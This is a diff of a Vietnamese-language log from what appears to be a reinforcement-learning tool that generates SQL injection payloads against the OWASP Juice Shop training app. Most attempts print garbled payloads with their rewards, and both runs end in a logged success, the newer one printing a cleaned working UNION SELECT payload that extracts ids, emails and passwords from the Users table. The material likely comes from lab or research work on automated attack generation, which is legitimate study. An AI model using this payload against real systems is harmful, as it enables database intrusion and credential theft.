@@ -1,48 +1,53 @@
-2025-11-08 15:24:50,356 - --- Bắt đầu tự động dự đoán (tối đa 200 lần) ---
-2025-11-08 15:24:51,039 - [QTable] Đã tải model từ: results/target_results/juiceshop_model_v1.json
-2025-11-08 15:24:51,039 - 
+2025-11-08 16:30:58,219 - --- Bắt đầu tự động dự đoán (tối đa 200 lần) ---
+2025-11-08 16:30:58,973 - [QTable] Đã tải model từ: results/target_results/juiceshop_model_v1.json
+2025-11-08 16:30:58,974 - 
 --- Lần thử 1/200 ---
-2025-11-08 15:24:51,041 -   (Payload quá dài 194 chars, dừng sớm tại step 27)
-2025-11-08 15:24:51,042 - Đã tạo Payload: "--FROMadmin'admin'))FROM''))FROM''UsersadminNULLbemailORNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,--aadmin(*aNULLa')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--" (dài 194 chars)
-2025-11-08 15:24:51,043 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,146 -   Kết quả: Thất bại (Reward=-3). Đang thử lại...
-2025-11-08 15:24:51,147 - 
+2025-11-08 16:30:58,976 -   (Payload quá dài 123 chars, dừng sớm tại step 29)
+2025-11-08 16:30:58,977 - Đã tạo Payload: "(ORemailFROM=''a'))b)SELECT'' '(password)'=''UNION'passwordid,email,password,NULL,NULL,NULL,NULL,NULL,NULL*Usersadmin'b'=''" (dài 123 chars)
+2025-11-08 16:30:58,977 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,084 - 
 --- Lần thử 2/200 ---
-2025-11-08 15:24:51,150 -   (Payload quá dài 144 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,151 - Đã tạo Payload: "*a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--'email'bUNION'Userspassword='','''))'1=0FROM(FROMUsers=''*'FROM)'" (dài 144 chars)
-2025-11-08 15:24:51,153 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,252 -   Kết quả: Thất bại (Reward=-5). Đang thử lại...
-2025-11-08 15:24:51,253 - 
+2025-11-08 16:30:59,086 -   (Payload quá dài 121 chars, dừng sớm tại step 31)
+2025-11-08 16:30:59,088 - Đã tạo Payload: "b,'email='')UNION''id,email,password,NULL,NULL,NULL,NULL,NULL,NULL'FROMFROM'NULL*1=1=''NULLFROMadminba'NULL')''))NULLAND*" (dài 121 chars)
+2025-11-08 16:30:59,091 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,199 - 
 --- Lần thử 3/200 ---
-2025-11-08 15:24:51,254 -   (Payload quá dài 168 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,255 - Đã tạo Payload: "ORFROMNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULLUsers'''--ANDNULLemail,emailUsers*NULL'SELECT'))'id,email,password,NULL,NULL,NULL,NULL,NULL,NULL*1=1--SELECT--password" (dài 168 chars)
-2025-11-08 15:24:51,256 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,329 -   Kết quả: Thất bại (Reward=-3). Đang thử lại...
-2025-11-08 15:24:51,330 - 
+2025-11-08 16:30:59,201 -   (Payload quá dài 199 chars, dừng sớm tại step 26)
+2025-11-08 16:30:59,202 - Đã tạo Payload: "FROM1=1''id,email,password,NULL,NULL,NULL,NULL,NULL,NULL''id,email,password,NULL,NULL,NULL,NULL,NULL,NULLemailid,email,password,NULL,NULL,NULL,NULL,NULL,NULL'  ,--''passwordNULL'1=1NULLNULL,NULL'--''" (dài 199 chars)
+2025-11-08 16:30:59,205 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,273 - 
 --- Lần thử 4/200 ---
-2025-11-08 15:24:51,332 -   (Payload quá dài 184 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,332 - Đã tạo Payload: "NULL,NULL(a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--'1=1 )OR( ''SELECTORAND(1=0UNION*b password'AND)id,email,password,NULL,NULL,NULL,NULL,NULL,NULLb" (dài 184 chars)
-2025-11-08 15:24:51,334 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,402 -   Kết quả: Thất bại (Reward=-5). Đang thử lại...
-2025-11-08 15:24:51,403 - 
+2025-11-08 16:30:59,275 -   (Payload quá dài 144 chars, dừng sớm tại step 26)
+2025-11-08 16:30:59,276 - Đã tạo Payload: "1=1SELECT--)='''a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--adminUsers1=0''1=0'--SELECTUsersFROM''')aSELECT''*" (dài 144 chars)
+2025-11-08 16:30:59,277 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,348 - 
 --- Lần thử 5/200 ---
-2025-11-08 15:24:51,405 -   (Payload quá dài 233 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,406 - Đã tạo Payload: "Users--,id,email,password,NULL,NULL,NULL,NULL,NULL,NULLSELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'NULLNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL''ba, '1=1(FROMNULL'1=1--SELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULLAND'" (dài 233 chars)
-2025-11-08 15:24:51,415 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,490 -   Kết quả: Thất bại (Reward=-3). Đang thử lại...
-2025-11-08 15:24:51,491 - 
+2025-11-08 16:30:59,350 -   (Payload quá dài 290 chars, dừng sớm tại step 26)
+2025-11-08 16:30:59,351 - Đã tạo Payload: "NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL SELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULLNULL,NULLUNION'password 'NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULLNULL'))-- email)NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'NULLaORUsersFROM',id,email,password,NULL,NULL,NULL,NULL,NULL,NULL" (dài 290 chars)
+2025-11-08 16:30:59,352 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,457 - 
 --- Lần thử 6/200 ---
-2025-11-08 15:24:51,493 -   (Payload quá dài 161 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,494 - Đã tạo Payload: "aORpassword1=1Users'password')(ANDUsersemailUNIONa')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users----*a*SELECT,=''--NULL,NULL'--admin" (dài 161 chars)
-2025-11-08 15:24:51,496 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,561 -   Kết quả: Thất bại (Reward=-3). Đang thử lại...
-2025-11-08 15:24:51,562 - 
+2025-11-08 16:30:59,458 -   (Payload quá dài 186 chars, dừng sớm tại step 26)
+2025-11-08 16:30:59,459 - Đã tạo Payload: ",FROM'*UNIONOR=''('))(OR'--NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULLNULL,NULL=''1=1'))ANDa')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--'admin'))--'a'))" (dài 186 chars)
+2025-11-08 16:30:59,461 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,532 - 
 --- Lần thử 7/200 ---
-2025-11-08 15:24:51,563 -   (Payload quá dài 513 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,564 - Đã tạo Payload: "a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--ANDbadmina')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--aUsers'a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--UsersNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'ORNULL,NULL--1=0id,email,password,NULL,NULL,NULL,NULL,NULL,NULLANDid,email,password,NULL,NULL,NULL,NULL,NULL,NULL--a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--ORemailemailFROM--OR" (dài 513 chars)
-2025-11-08 15:24:51,572 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,654 - 
+2025-11-08 16:30:59,534 -   (Payload quá dài 207 chars, dừng sớm tại step 26)
+2025-11-08 16:30:59,535 - Đã tạo Payload: "emailORpassword'1=1'email'(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL(NULL,NULLNULL,NULL'NULL1=1--('ANDemail'NULL,NULL'ANDUNIONa')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--" (dài 207 chars)
+2025-11-08 16:30:59,541 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,675 - 
+--- Lần thử 8/200 ---
+2025-11-08 16:30:59,677 -   (Payload quá dài 172 chars, dừng sớm tại step 26)
+2025-11-08 16:30:59,678 - Đã tạo Payload: "1=1=''OR'))emailNULL,NULLa UsersANDAND(password**--FROM'id,email,password,NULL,NULL,NULL,NULL,NULL,NULL1=1''OR'))NULL,NULL1=0id,email,password,NULL,NULL,NULL,NULL,NULL,NULL" (dài 172 chars)
+2025-11-08 16:30:59,679 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,747 - 
+--- Lần thử 9/200 ---
+2025-11-08 16:30:59,749 -   (Payload quá dài 206 chars, dừng sớm tại step 26)
+2025-11-08 16:30:59,750 - Đã tạo Payload: "a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--1=0a*1=1NULL1=1bNULL,NULLNULLNULL,NULL1=1NULL,NULL'NULL,NULLNULL,NULLadmin'b'--,'NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL*b," (dài 206 chars)
+2025-11-08 16:30:59,751 -   Đang gửi payload để kiểm tra...
+2025-11-08 16:30:59,844 - 
 ========================================
-2025-11-08 15:24:51,655 - !!! TẤN CÔNG THÀNH CÔNG (Reward=200) !!!
-2025-11-08 15:24:51,656 - Payload chiến thắng: a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--ANDbadmina')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--aUsers'a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--UsersNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'ORNULL,NULL--1=0id,email,password,NULL,NULL,NULL,NULL,NULL,NULLANDid,email,password,NULL,NULL,NULL,NULL,NULL,NULL--a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--ORemailemailFROM--OR
-2025-11-08 15:24:51,659 - ========================================
+2025-11-08 16:30:59,845 - !!! TẤN CÔNG THÀNH CÔNG (Reward=200) !!!
+2025-11-08 16:30:59,846 - Payload gốc (rác): a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--1=0a*1=1NULL1=1bNULL,NULLNULLNULL,NULL1=1NULL,NULL'NULL,NULLNULL,NULLadmin'b'--,'NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL*b,
+2025-11-08 16:30:59,851 - Payload (đã dọn dẹp): a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
+2025-11-08 16:30:59,855 - ========================================
